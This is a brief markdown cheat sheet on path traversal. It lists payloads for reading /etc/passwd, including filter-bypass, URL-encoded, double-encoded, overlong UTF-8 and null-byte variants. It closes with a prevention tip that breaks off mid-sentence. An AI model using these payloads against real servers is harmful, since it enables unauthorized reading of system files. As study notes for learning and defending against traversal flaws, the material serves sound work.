# Path Traversal

## Basic works

* /var/www/html contains html files
* ../../../etc/passwd

## Basic input santization vulnerbaility

* ....//....//....//etc/passwd

## Multipart form data santization vulnerbaility

* %2e%2e%2f == ../
* %252e%252e%252f == ../
* ..%c0%af == ../
* ..%ef%bc%8f == ../

## Full path as input traversal

* /var/www/html/images/../../../etc/passwd

## Null path traversal

* %00.png ignores the .png extension

## Prevent path traversal

* Check canoical path matches the base path and clear all special characters before processing the